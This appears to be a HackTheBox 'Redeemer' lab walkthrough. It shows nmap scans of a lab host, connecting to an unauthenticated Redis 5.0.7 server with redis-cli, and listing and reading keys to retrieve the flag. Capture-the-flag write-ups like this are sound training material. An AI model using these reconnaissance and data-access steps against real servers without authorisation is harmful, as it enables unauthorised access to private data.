## Redeemer HackTheBox
### Room Description:
cool room about redis. I've never worked with it. but let me tell you something, you should work with it. 

Key Features:
- Network enm
- Redis
- redis-cli

----

#### First Step: `Network Enum`
First thing first. Run Nmap to find *what's up*:
```bash
nmap -A -sV --privileged -T5 10.129.112.191 -p- -O -sC -v
```
Result:
```terminal
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```
it has **`Redis`** running on port `6379`. It's time to find exploit for this version.

#### Second Step: `Finding my way in`
Now as we know the service and the version, we will try to find relative exploit for this.

I've found a Nmap command to get more info about the server: 
```bash
nmap --script redis-info -sV -p 6379 10.129.112.191 -v -T4
```
After running a scan I got this:
```terminal
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7 (64 bits)
| redis-info: 
|   Version: 5.0.7
|   Operating System: Linux 5.4.0-77-generic x86_64
|   Architecture: 64 bits
|   Process ID: 749
|   Used CPU (sys): 1.645416
|   Used CPU (user): 1.207701
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 839.48K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.14.6
```
Nice. Now it's time to connect with the server. We can do it in 2 different way:

1. NetCat:
   1. ` nc -vn 10.10.10.10 6379`
2. redis-cli:
   1. `redis-cli -h 10.10.10.10`
   > if it's not installed: `sudo apt-get install redis-tools`

I will use **`redis-cli`** cause `nc` doesn't offer necessery help for command. So if you connect using `nc`, you will not be able to use `help`.

#### Third Step: `Getting what we need`
As we got into the server. Now it's time to find the flag. I used [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) page to find necessary commands.

`Let's see what we can do:`

First we have to see what's inside the database. for that we can use the command **`INFO`**<br>
`INFO keyspace` -> this will retrun the database availabe on the server. In our case, we will get:
```terminal
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```
Now we will view what are the keys of `db0`. For that we have to select it first:<br>
`SELECT 0`<br>
the view the keys:<br>
`KEYS *`<br>You will have
```terminal
1) "numb"
2) "temp"
3) "stor"
4) "flag"
```
To view each key, use: `GET <key>`<br>
*e.g:* we will get the `flag`: `GET flag`
```terminal
10.129.112.191:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
```
That's how you do it.
